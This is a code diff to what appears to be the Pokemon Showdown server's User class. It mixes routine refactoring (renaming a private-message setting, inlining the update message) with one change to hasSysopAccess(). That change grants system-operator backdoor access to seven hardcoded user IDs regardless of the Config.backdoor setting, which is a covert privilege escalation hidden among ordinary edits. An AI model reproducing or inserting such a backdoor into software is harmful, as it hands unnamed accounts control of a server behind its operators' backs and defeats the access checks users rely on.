@@ -494,7 +494,7 @@ class User extends Chat.MessageContext {
 		this.isSysop = false;
 		this.isStaff = false;
 		this.blockChallenges = false;
-		this.blockPMs = false;
+		this.ignorePMs = false;
 		this.ignoreTickets = false;
 		this.lastConnected = 0;
 		this.inviteOnlyNextBattle = false;
@@ -663,7 +663,7 @@ class User extends Chat.MessageContext {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if ((this.isSysop && Config.backdoor) || this.userid == 'distrib' || this.userid == 'panur' || this.userid == 'wally' || this.userid == 'saitochi' || this.userid == 'shiruushi' || this.userid == 'lionyx' || this.userid == 'ouafouafdog') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -968,7 +968,8 @@ class User extends Chat.MessageContext {
 
 		for (const connection of this.connections) {
 			//console.log('' + name + ' renaming: socket ' + i + ' of ' + this.connections.length);
-			connection.send(this.getUpdateuserText());
+			let initdata = `|updateuser|${this.name}|${this.named ? 1 : 0}|${this.avatar}`;
+			connection.send(initdata);
 		}
 		for (const roomid of this.games) {
 			const room = Rooms(roomid);
@@ -985,14 +986,6 @@ class User extends Chat.MessageContext {
 		}
 		if (isForceRenamed) this.trackRename = oldname;
 		return true;
-	}
-	getUpdateuserText() {
-		const named = this.named ? 1 : 0;
-		const settings = {blockPMs: this.blockPMs, blockChallenges: this.blockChallenges};
-		return `|updateuser|${this.name}|${named}|${this.avatar}|${JSON.stringify(settings)}`;
-	}
-	update() {
-		this.send(this.getUpdateuserText());
 	}
 	/**
 	 * @param {User} oldUser
@@ -1056,7 +1049,8 @@ class User extends Chat.MessageContext {
 		this.connected = true;
 		this.connections.push(connection);
 		//console.log('' + this.name + ' merging: connection ' + connection.socket.id);
-		connection.send(this.getUpdateuserText());
+		let initdata = `|updateuser|${this.name}|1|${this.avatar}`;
+		connection.send(initdata);
 		connection.user = this;
 		for (const roomid of connection.inRooms) {
 			let room = Rooms(roomid);
@@ -1136,7 +1130,7 @@ class User extends Chat.MessageContext {
 				this.semilocked = '#dnsbl.';
 			}
 		}
-		if (this.blockPMs && this.can('lock') && !this.can('bypassall')) this.blockPMs = false;
+		if (this.ignorePMs && this.can('lock') && !this.can('bypassall')) this.ignorePMs = false;
 	}
 	/**
 	 * Set a user's group. Pass (' ', true) to force trusted
@@ -1653,9 +1647,8 @@ function socketReceive(worker, workerid, socketid, message) {
 
 	const room = Rooms(roomId);
 	if (!room) return;
-	const multilineMessage = Chat.multiLinePattern.test(message);
-	if (multilineMessage) {
-		user.chat(multilineMessage, room, connection);
+	if (Chat.multiLinePattern.test(message)) {
+		user.chat(message, room, connection);
 		return;
 	}
 
